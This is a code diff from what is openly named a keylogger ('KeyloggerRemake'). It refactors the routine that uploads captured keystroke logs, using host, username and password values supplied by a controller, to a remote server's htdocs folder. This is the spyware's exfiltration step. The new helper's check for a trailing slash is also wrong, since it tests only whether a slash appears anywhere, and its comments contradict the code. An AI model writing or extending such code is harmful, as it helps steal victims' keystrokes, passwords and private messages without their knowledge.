@@ -9,17 +9,9 @@ namespace KeyloggerRemake
         //To upload a log
         public static void uploadLog(string strHost, string strUser, string strPass, string strLogName, string strLogFile)
         { //Takes in the given host, user, pass (from the Controller), and log name and the file (full directory)
-            string strUploadURL = strHost;
 
-            //Checks if the host url ends with a '/' or not
-            if (strUploadURL.LastIndexOf('/') != -1) //If it doesn't
-            {
-                strUploadURL += "/htdocs/";
-            }
-            else //If it does
-            {
-                strUploadURL += "htdocs/";
-            }
+            //Gets the valid URL using the host
+            string strUploadURL = getValidURL(strHost);
 
             using (WebClient wc = new WebClient())
             {
@@ -34,6 +26,21 @@ namespace KeyloggerRemake
                     Console.WriteLine(e);
                 }
             }
+        }
+
+        private static string getValidURL(string strHost)
+        {
+            //Checks if the host url ends with a '/' or not
+            if (strHost.LastIndexOf('/') != -1) //If it doesn't
+            {
+                strHost += "/htdocs/";
+            }
+            else //If it does
+            {
+                strHost += "htdocs/";
+            }
+
+            return strHost;
         }
     }
 }
